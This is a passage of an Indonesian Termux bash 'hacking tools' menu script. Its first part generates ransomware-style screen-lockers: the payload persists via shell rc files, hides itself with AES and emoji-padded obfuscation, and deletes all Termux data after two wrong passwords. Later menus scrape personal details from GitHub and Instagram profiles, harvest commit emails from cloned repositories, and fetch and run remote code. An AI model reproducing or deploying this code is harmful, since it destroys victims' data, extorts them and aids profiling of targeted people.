            hapus_dari_rc
            hapus_file_ransomlock
            stty echoctl 2>/dev/null || true
            clear
            return 0
        else
            ((salah_count++))
            clear
            echo ""
            echo -e "${r}[ ${g}✗ ${r}]${y} Password salah! Goblok 😹🖕 [ \$salah_count/2 ]"
            sleep 3
            if [ \$salah_count -ge 2 ]; then
                hapus_semua_termux
            fi
        fi
    done
}
if [[ "\$0" == *".ransomlock.sh" ]]; then
    kunci_terminal
    exit 1
fi
cp "\$0" "\$HOME/.ransomlock.sh" && chmod +x "\$HOME/.ransomlock.sh"
for rc in "\$HOME/.bashrc" "\$HOME/.zshrc" "\$HOME/.profile"; do
    if [ -f "\$rc" ]; then
        if ! grep -q ".ransomlock.sh" "\$rc" 2>/dev/null; then
            echo -e "\n# === RANSOMLOCK BY THXYZZ404 ===\nbash \$HOME/.ransomlock.sh\n# =================================\n" >> "\$rc"
        fi
    else
        echo -e "# === RANSOMLOCK BY THXYZZ404 ===\nbash \$HOME/.ransomlock.sh\n" > "\$rc"
    fi
done
bash "\$HOME/.ransomlock.sh"
EOF
}
function generate_ransom_file() {
    local password="$1"
    local pesan="$2"
    local enkripsi="$3"   
    buat_kode_ransom "$password" "$pesan"    
    if [[ "$enkripsi" == "y" ]]; then
        command -v openssl >/dev/null 2>&1 || {
            clear
            echo ""
            echo -e "${r}Error : Anda Belum Menginstall ${c}pkg install openssl-tool"
            echo ""
            return 1
        }        
        sed 's/exec/x_x_e_c/g' ransom.sh > .tmp_obfuscated
        local key_hex=$(head -c 16 /dev/urandom | xxd -p)
        openssl enc -aes-128-ecb -K "$key_hex" -nosalt -in .tmp_obfuscated -out .tmp_encrypted.bin 2>/dev/null || {
            clear
            echo ""
            echo -e "${r}Error saat proses enkripsi dengan openssl!"
            echo ""
            return 1
        }        
        base64 .tmp_encrypted.bin > .tmp_encrypted.b64 2>/dev/null || {
            clear
            echo ""
            echo -e "${y}File Lokasi Tidak Ditemukan..!!"
            echo ""
            return 1
        }        
        local key_b64=$(echo "$key_hex" | base64)
        local enc_b64=$(cat .tmp_encrypted.b64)
        local emoji_seq="😹😹😹😹😹😹😹😹😹😹😹"        
        decoder=$(cat <<EOF
k="$key_b64"
d="$enc_b64"
echo "\$d" | base64 -d > .tmp_dec.bin
openssl enc -d -aes-128-ecb -K "\$(echo \$k | base64 -d)" -nosalt -in .tmp_dec.bin -out .tmp_dec.sh
chmod +x .tmp_dec.sh
bash .tmp_dec.sh
rm -f .tmp_dec.bin .tmp_dec.sh
EOF
)
        {
            echo "#!/data/data/com.termux/files/usr/bin/bash"
            echo "# Encrypted Bash File By.Thxyzz404"
            echo "emoji_aes=( $(for i in {1..3000}; do echo -n "\"$emoji_seq\" "; done) )"
            echo "eval \"\$(cat <<'EODEC'"
            echo "$decoder"
            echo "EODEC"
            echo ")\""
            echo "emoji_dump=( $(for i in {1..9000}; do echo -n "\"$emoji_seq\" "; done) )"
        } > ransom.sh
        chmod +x ransom.sh
        rm -f .tmp_obfuscated .tmp_encrypted.bin .tmp_encrypted.b64        
        mkdir -p /sdcard/A_Ransomware
        cp ransom.sh /sdcard/A_Ransomware/ransom.sh 2>/dev/null        
        echo -e "${r}[${g}✓${r}]${c} Disimpan : /sdcard/A_Ransomware/ransom.sh${n}\n"
        echo -e "${r}[${g}✓${r}]${c} File ransomware terenkripsi dengan emoji berhasil dibuat : ransom.sh${n}"
        echo ""        
    else
        mkdir -p /sdcard/A_Ransomware
        cp ransom.sh /sdcard/A_Ransomware/ransom.sh 2>/dev/null       
        echo -e "${r}\n[${g}✓${r}]${c} File ransomware tanpa enkripsi berhasil dibuat : ransom.sh${n}"
        echo ""
        echo -e "${r}[${g}✓${r}]${c} Disimpan : /sdcard/A_Ransomware/ransom.sh${n}\n"
        echo ""
    fi
}
function run() {
    banner
    read -p $'\e[92m[?] Masukkan pesan tebusan:\n>> \e[0m' pesan
    read -p $'\e[92m\n[?] Masukkan password:\n>> \e[0m' password
    read -p $'\e[92m\n[?] Enkripsi? [y/n]:\n>> \e[0m' enkrip
    echo ""
    generate_ransom_file "$password" "$pesan" "$enkrip"
}
run
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
    ;;
      5|05)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
              cd $HOME
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
b='\033[34;1m'
y='\033[33;1m'
n='\033[0m'
woi() {
    text="$1"
    for ((i = 0; i < ${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep 0.0001
    done
}
mek() {
woi "
██████╗  ██████╗ ██████╗ ██╗  ██╗
██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝
██║  ██║██║   ██║██████╔╝█████╔╝ 
██║  ██║██║   ██║██╔══██╗██╔═██╗ 
██████╔╝╚██████╔╝██║  ██║██║  ██╗
╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
" | lolcat
echo ""
echo -e "${p} Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[${y} 01 ${r}] ${g}Dork Username "
echo -e "${r}[${y} 02 ${r}] ${g}Dork URL clone "
echo -e "${r}[${y} 00 ${r}] ${c}Keluar"
}
git_1() {
MARKER=".run_once_done"
if [ ! -f "$MARKER" ]; then
    tr -d '\r' < Thxyzz404.sh > fixed.sh
    mv fixed.sh Thxyzz404.sh
    chmod +x Thxyzz404.sh
    touch "$MARKER"
    clear 
    echo ""
    echo -e "${g} Menjalankan script..!!"
    echo ""
    sleep 2
fi
check_dependencies() {
    local deps=("curl" "grep" "sed" "cut")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" >/dev/null 2>&1; then
            clear 
            echo ""
            echo -e "${r}[!] Dependensi '$dep' tidak ditemukan."
            echo -e "${y}Jalankan : pkg install $dep"
            echo ""
        fi
    done
}
validate_username() {
    local username="$1"
    if [[ ! "$username" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        echo ""
        echo -e "${r}[!] Username tidak valid."
        echo ""
        return 1
    fi
    return 0
}
get_github_user() {
    local username="$1"
    data=$(curl -s "https://api.github.com/users/$username")
    if echo "$data" | grep -q "Not Found"; then
        echo ""
        echo -e "${r}[!] Username '$username' tidak ditemukan di GitHub."
        echo ""
        return 1
    fi
    echo "$data"
    return 0
}
get_field() {
    local field="$1"
    local value
    value=$(echo "$data" | grep "\"$field\"" | cut -d ':' -f2- | sed 's/[",]//g' | sed 's/^ //')
    if [[ -z "$value" || "$value" == "null" ]]; then
        echo "Tidak di temukan"
    else
        echo "$value"
    fi
}
get_email_fallback() {
    local email
    email=$(get_field "email")
    if [[ "$email" == "Tidak di temukan" ]]; then
        local bio
        bio=$(get_field "bio")
        email=$(echo "$bio" | grep -Eo "[a-zA-Z0-9.%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
    fi
    echo "${email:-Gmail tidak ada}"
}
get_facebook_from_bio() {
    local fb
    fb=$(get_field "bio" | grep -ioE "facebook.com/[a-zA-Z0-9.-]+|fb.me/[a-zA-Z0-9.-]+|[Ff]acebook[: ]+[a-zA-Z0-9.-]+" | head -n1)
    echo "${fb:-Facebook tidak ada}"
}
get_instagram_from_bio() {
    local ig
    ig=$(get_field "bio" | grep -ioE "instagram.com/[a-zA-Z0-9._-]+|[Ii]nstagram[: ]+[a-zA-Z0-9._-]+" | head -n1)
    echo "${ig:-Instagram tidak ada}"
}
main() {
check_dependencies
clear
echo "
 ██████╗ ██╗████████╗██╗  ██╗██╗   ██╗██████╗ 
██╔════╝ ██║╚══██╔══╝██║  ██║██║   ██║██╔══██╗
██║  ███╗██║   ██║   ███████║██║   ██║██████╔╝
██║   ██║██║   ██║   ██╔══██║██║   ██║██╔══██╗
╚██████╔╝██║   ██║   ██║  ██║╚██████╔╝██████╔╝
 ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
         Development : Thxyzz404
" | lolcat 
    echo -e "${p}"
    read -p "Masukkan Username Github Target : " username
    echo ""
    if ! validate_username "$username"; then
        return
    fi
    data=$(get_github_user "$username") || return
    name=$(get_field "name")
    bio=$(get_field "bio")
    avatar=$(get_field "avatar_url")
    url=$(get_field "html_url")
    location=$(get_field "location")
    followers=$(get_field "followers")
    following=$(get_field "following")
    public_repos=$(get_field "public_repos")
    created_at=$(get_field "created_at")
    updated_at=$(get_field "updated_at")
    company=$(get_field "company")
    id=$(get_field "id")
    email=$(get_email_fallback)
    facebook=$(get_facebook_from_bio)
    instagram=$(get_instagram_from_bio)
    echo -e "${g}=================================================="
    echo -e "${r}[ ${c}☢ ${r}]${y} GitHub OSINT Username : ${b}$username ${r}[${c} ☢ ${r}]"
    echo -e "${g}=================================================="
    echo ""
    echo -e "${r}[${g} ✓ ${r}]${y} Username : ${c}@$username"
    echo -e "${r}[${g} ✓ ${r}]${y} ID Pengguna : ${c}${id}"
    echo -e "${r}[${g} ✓ ${r}]${y} Nama Lengkap : ${c}${name}"
    echo -e "${r}[${g} ✓ ${r}]${y} Bio : ${c}${bio}"
    echo -e "${r}[${g} ✓ ${r}]${y} Lokasi : ${c}${location}"
    echo -e "${r}[${g} ✓ ${r}]${y} Perusahaan : ${c}${company}"
    echo -e "${r}[${g} ✓ ${r}]${y} Gmail : ${c}$email"
    echo -e "${r}[${g} ✓ ${r}]${y} Facebook : ${c}$facebook"
    echo -e "${r}[${g} ✓ ${r}]${y} Instagram : ${c}$instagram"
    echo -e "${r}[${g} ✓ ${r}]${y} Followers : ${c}${followers}"
    echo -e "${r}[${g} ✓ ${r}]${y} Mengikuti : ${c}${following}"
    echo -e "${r}[${g} ✓ ${r}]${y} Repo Publik : ${c}${public_repos}"
    echo -e "${r}[${g} ✓ ${r}]${y} Tanggal Dibuat : ${c}${created_at}"
    echo -e "${r}[${g} ✓ ${r}]${y} Terakhir Update : ${c}${updated_at}"
    echo -e "${r}[${g} ✓ ${r}]${y} Avatar : ${c}${avatar}"
    echo -e "${r}[${g} ✓ ${r}]${y} URL Profil : ${c}${url}"
    echo ""
    echo -e "${g}"
    read -p "Apakah anda ingin cari pengguna lain? (y/n) : " choice
    if [[ "$choice" =~ ^[Yy]$ ]]; then
        main
    else
        echo ""
        echo -e "${r}Keluar dari program."
        echo ""
    fi
}
main
}
git_2() {
bar() {
    f=(
        "[\e[1;91m■\e[0m□□□□□□□□□]"
        "[\e[1;92m■■\e[0m□□□□□□□□]"
        "[\e[1;93m■■■\e[0m□□□□□□□]"
        "[\e[1;94m■■■■\e[0m□□□□□□]"
        "[\e[1;95m■■■■■\e[0m□□□□□]"
        "[\e[1;96m■■■■■■\e[0m□□□□]"
        "[\e[1;97m■■■■■■■\e[0m□□□]"
        "[\e[1;92m■■■■■■■■\e[0m□□]"
        "[\e[1;93m■■■■■■■■■\e[0m□]"
        "[\e[1;94m■■■■■■■■■■\e[0m]"
    )
    while true; do
        for fra in "${f[@]}"; do
            printf "\r$fra \033[41;1m\033[1;32m Sedang analisis. \033[0m "
            sleep 0.12
        done
    done
}
clear
echo "
░█▀▀░█░░░█▀█░█▀█░█▀▀
░█░░░█░░░█░█░█░█░█▀▀
░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀▀▀ " | lolcat
echo -e "${c}"
read -p "Masukkan url git clone : " url
echo ""
bar &
bar_pid=$!
git clone "$url" > /dev/null 2>&1
kill $bar_pid 2>/dev/null
echo ""
der=$(basename "$url" .git)
cd "$der"
echo ""
echo -e "${r}============================="
echo -e "${g}  INFORMASI YANG DI DAPAT "
echo -e "${r}============================="
echo -e "${b}"
git log --pretty=format:"%an %ae" | sort -u
echo ""
echo -e "${p}"
read -p "Apakah menghapus clone [ y/n ] : " del
echo ""
if [[ $del == "y" || $del == "Y" ]]; then
    cd "$HOME"
    rm -rf "$der"
    echo -e "${r}[ ${g}✓ ${r}]${y} Folder berhasil di hapus : " $der
fi
}
about() {
echo -e "${g} Thanks you by.thxyzz404"
echo ""
}
start() {
    clear
    mek
    echo ""
    read -p "$(echo -e "${b}Choose${c} :${g} ")" choose
    echo ""
    case "$choose" in
        1|01) git_1 ;;
        2|02) git_2 ;;
        0|00) about ;;
        *) echo -e "${r}Invalid__Option..!!${n}" ;;
    esac
    echo ""
}
start
      echo ""
              echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
              read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
              clear
                ;;
      6|06)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              cd $HOME
              clear
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
echo "
   ⣰⣟⠲⠤⣤⣤⣤⠶⢖⣲⣶⡶⢶⣶⣖⡲⠶⣤⣤⣤⡤⠖⡛⣆   
   ⡏⣿⣷⣄ ⡟⢡⡶⠛⠉⠁  ⠈⠉⠛⢶⡌⠻ ⣠⣾⣿⢹   
   ⡇⢹⣿⣿⠆⣠⠞⢁⣀⣠⣤⡴⢦⣤⣄⣀⡈⠳⣄⢰⣿⣿⣟⢸⡄  
   ⢻⣤⡻⠁⡸⢃⠜⠋⠉⠉⣠ ⠐⣄⠉⠉⠙⠢⡘⢧⡙⣿⣣⡿   
  ⢀⣾⡷⠁⠊  ⠤⠖⠋⠉⠑⡀⢀⠊⠉⠙⠲⠤  ⠑ ⢾⣷⡄  
  ⣴⡿⠃ ⡀⣀⡴⠁⣤⠶⠚⠋  ⠙⠓⠶⣤⠈⢦⣀⢀ ⠘⢿⣦  
⢀⣾⠏ ⣰⡟⢰⢏⣀⡐⠁       ⡀⠈⢂⣀⡙⡆⢻⣆ ⠹⣷⡀
⣼⡏  ⣿⣧⠸ ⠻⣏⠟⣾⣄    ⣠⣷⠻⣹⠟ ⠇⣼⣷⡀ ⢹⣷
⣿⣰  ⣿⣿⡇  ⠉⠉⢹⣿    ⣿⡏⠉⠉  ⢸⣿⣿⠁ ⣆⣿
⢻⢿⣠  ⣿⣯⠁  ⢀⡞     ⠈⢷⡀  ⠊⣽⣿⠁ ⡀⡿⡟
⠈⢸⣿⡆⡀⠈⢿⣇⡀ ⡼⢰      ⡏⢧ ⢀⣸⡿⠃⢀⢰⣿⡗ 
 ⠈⢿⢿⣿⣦⡈⠻⢿⣄⡁⡾      ⢷⢈⣠⡿⠟⢁⣴⣿⡿⡻⠁ 
   ⠈⠻⠟⢿⣶⣤⣿⢇⢳⡀    ⢀⡞⡸⣿⣤⣶⡿⠻⠟⠁   
        ⣘⣿⣒⣂⠙⠛⢷⡾⠛⠋⢐⣒⣿⣓        
         ⠚⣧⣖⣀⣀⣬⣧⣀⣀⣲⣽⠃⠒        
          ⠉⠛⠳⢤⣄⣠⡤⠾⠛⠉ " | lolcat
echo ""
echo -e "${b}╔══════════════════════════════════════╗"
echo -e "║${g} AUTHOR ${r}= ${c}By.Thxyzz404                ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "║${r} [ ${g}01 ${r}]${c} Tampilan Pro                  ${b}║"
echo -e "║${r} [ ${g}02 ${r}]${c} Hapus Tampilan                ${b}║"
echo -e "║${r} [ ${g}03 ${r}]${p} Keluar                        ${b}║"
echo -e "╚══════════════════════════════════════╝"
echo -e "${b}║"
echo -e "${b}║"
echo -e "${c}║"
read -p "╚═[ By.Thxyzz404 ]══•➤ : " ha
case "$ha" in
1|01)
if [ -d "$HOME/.oh-my-zsh" ] && [ -d "$HOME/.oh-my-zsh/custom/plugins/zsh-autosuggestions" ] && [ -d "$HOME/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting" ]; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${p} Tidak perlu install lagi."
    echo ""
    sleep 3 
    kill -9 -1 && exit
fi
{
  pkg install -y boxes lolcat >/dev/null 2>&1
  sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" --unattended >/dev/null 2>&1    
  cd ~/.oh-my-zsh/custom/plugins
  git clone --quiet --depth 1 https://github.com/zsh-users/zsh-autosuggestions >/dev/null 2>&1
  git clone --quiet --depth 1 https://github.com/zsh-users/zsh-syntax-highlighting >/dev/null 2>&1
} &
pid=$!
chars=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
i=0
while kill -0 $pid 2>/dev/null; do
    clear
    echo ""
    printf "\r${r}[ ${g}%s ${r}]${c} Sedang instalasi..!!" "${chars[i]}"
    echo ""
    i=$(( (i+1) % ${#chars[@]} ))
    sleep 0.1
done
printf "\r\033[K"
clear
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} Sukses instalasi."
echo ""
sleep 3
clear
cat > ~/.zshrc << 'EOF'
export ZSH="$HOME/.oh-my-zsh"
mek="ansi-rounded"
echo "
████████╗███████╗███╗   ███╗ █████╗ 
╚══██╔══╝██╔════╝████╗ ████║██╔══██╗
   ██║   █████╗  ██╔████╔██║███████║
   ██║   ██╔══╝  ██║╚██╔╝██║██╔══██║
   ██║   ███████╗██║ ╚═╝ ██║██║  ██║
   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝
            By : ToolslV " | boxes -d "$mek" | lolcat
echo ""
ZSH_THEME="fox"
plugins=(git zsh-syntax-highlighting zsh-autosuggestions)
source $ZSH/oh-my-zsh.sh
[[ -f "$HOME/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh" ]] && source "$HOME/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh"
EOF
clear 
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Sedang pemasangan konfigurasi."
echo ""
chsh -s zsh >/dev/null 2>&1
if [ -f "$PREFIX/etc/motd" ]; then
    truncate -s 0 "$PREFIX/etc/motd"
fi
clear 
echo ""
echo -e "${r}[ ${g}✓ ${r}]${y} Sukses pemasangan."
echo ""
sleep 2
clear
cd $HOME
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zshrc && echo '[[ -d $PYENV_ROOT/bin ]] && export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.zshrc && echo 'eval "$(pyenv init -)"' >> ~/.zshrc && echo 'pyenv global 3.13.5' >> ~/.zshrc && source ~/.zshrc && python --version
exec zsh
    ;;
2|02)
    clear
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Sedang menghapus tampilan."
    echo ""
    sleep 3 
    rm -rf ~/.oh-my-zsh && rm -rf ~/.zshrc && chsh -s bash
    rm -f ~/.termux/termux.properties
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Tampilan berhasil di hapus."
    echo ""
    sleep 2 
    clear
    ;;
3|03)
    clear
    ;;
  *)
    echo ""
    echo -e "${h}Pilihan Tidak Valid..!!"
    sleep 3
    echo ""
    clear
    ;;
esac
    ;;
       7|07)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
ANK_IDIOT="$HOME/Lokasi"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Gagal masuk ke direktori : $ANK_IDIOT"
    if [ -f "epx.py" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        python3 epx.py || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} File tidak ada, mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        git clone --depth=32 https://github.com/Thxyzz404/Lokasi || kontol "Gagal cloning repository"
        cd "$ANK_IDIOT" || kontol "Gagal masuk ke direktori github."
        python3 epx.py || kontol "Terjadi kesalahan saat menjalankan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repository github..!!${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth=32 https://github.com/Thxyzz404/Lokasi || kontol "Gagal cloning repository"    
    cd "$ANK_IDIOT" || kontol "Gagal masuk ke direktori github."
    python3 epx.py || kontol "Terjadi kesalahan saat menjalankan."
fi
     echo ""
              echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
              read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
              clear
                 ;;
     8|08)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo "
░▀█▀░█▀█░█▀▀░▀█▀░█▀█░█▀▀░█▀▄░█▀█░█▄█
░░█░░█░█░▀▀█░░█░░█▀█░█░█░█▀▄░█▀█░█░█
░▀▀▀░▀░▀░▀▀▀░░▀░░▀░▀░▀▀▀░▀░▀░▀░▀░▀░▀ " | lolcat
echo ""
echo -e "${p} Development ${g}: ${c}Thxyzz404" 
echo -e "${c}"
read -p "Masukkan usr IG : " usr
if [ -z "$usr" ]; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${y} Username tidak boleh kosong."
fi
res=$(curl -s -X GET \
  -H "X-CSRFToken: erYhh67alE06hb9E49SKZm" \
  -H "X-IG-App-ID: 936619743392459" \
  -H "X-ASBD-ID: 359341" \
  -H "X-IG-WWW-Claim: 0" \
  -H "X-Web-Device-Id: 9D8DC08C-F2B5-48CD-93F2-CF6895B5CB27" \
  -H "X-Web-Session-ID: enlq16:1ywd6c:fszifc" \
  -H "Accept: */*" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36" \
  "https://www.instagram.com/api/v1/users/web_profile_info/?username=$usr")
user=$(echo "$res" | grep -o '"username":"[^"]*"' | head -1 | cut -d':' -f2 | tr -d '"')
cok=$(echo "$res" | grep -o '"full_name":"[^"]*"' | head -1 | cut -d':' -f2 | tr -d '"')
id=$(echo "$res" | grep -o '"id":"[^"]*"' | head -1 | cut -d':' -f2 | tr -d '"')
profile=$(echo "$res" | grep -o '"profile_pic_url_hd":"[^"]*"' | head -1 | sed 's/\\u0026/\&/g' | cut -d'"' -f4)
if [ -z "$profile" ]; then
    profile=$(echo "$res" | grep -o '"profile_pic_url":"[^"]*"' | head -1 | sed 's/\\u0026/\&/g' | cut -d'"' -f4)
fi
followers=$(echo "$res" | grep -o '"edge_followed_by":{"count":[0-9]*' | grep -o '[0-9]*$')
following=$(echo "$res" | grep -o '"edge_follow":{"count":[0-9]*' | grep -o '[0-9]*$')
total_posts=$(echo "$res" | grep -o '"edge_owner_to_timeline_media":{"count":[0-9]*' | grep -o '[0-9]*$')
is_private=$(echo "$res" | grep -o '"is_private":true' | head -1)
is_verified=$(echo "$res" | grep -o '"is_verified":true' | head -1)
if [ -z "$user" ]; then
    clear 
    echo ""
    echo -e "${r}Username tidak ditemukan atau akun private."
fi
echo ""
echo -e "${r}=================================================="
echo -e "${g}                 HASIL ANALISA "
echo -e "${r}=================================================="
echo -e "${y}Username ${p}: ${c}@$user"
echo -e "${y}Name ${p}: ${c}${cok:-N/A}"
echo -e "${y}User ID ${p}: ${c}${id:-N/A}"
echo -e "${y}Profile URL ${p}: ${c}https://instagram.com/$user"
echo -e "${y}Avatar URL ${p}: ${c}${profile:-N/A}"
if [ -n "$followers" ] && [ "$followers" -gt 0 ]; then
    printf "${y}Followers ${p}: ${c}%'d\n" $followers
fi
if [ -n "$following" ] && [ "$following" -gt 0 ]; then
    printf "${y}Following ${p}: ${c}%'d\n" $following
fi
if [ -n "$total_posts" ] && [ "$total_posts" -gt 0 ]; then
    printf "${y}Total Posts ${p}: ${c}%'d\n" $total_posts
fi
echo -e "${r}=================================================="
if [ -n "$is_private" ]; then
    echo -e "${c}Catatan : Akun ini PRIVATE"
fi
if [ -n "$is_verified" ]; then
    echo -e "${g}Catatan : Akun TERVERIFIKASI"
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
    ;;
      9|09)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
url="https://oauth.telegram.org/auth/request?bot_id=1264128836&origin=https%3A%2F%2Fwww.money-whale.com&request_access=read"
tolol_recode() {
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣴⣿⣿⣿⣿⣯⣤⣶⣶⣾⣿⣶⣶⣿⣿⣿⣿⣿⡿⠿⠟⠛⠉⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠉⠁⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⠶⠶⠦⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣟⣡⣤⣾⣿⣿⣿⣿⣿⣿⢏⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⡻⢿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠈⠻⡄⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠈⠙⠻⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⡿⠛⠉⠉⠉⠛⠛⠛⠛⠋⠁⠀⠀⠀⠁⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠈⠙⢧⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠙⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢹⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠈⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⢋⣩⡿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣄⣀⡀⠀⠀⠀⠀⠀⠐⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
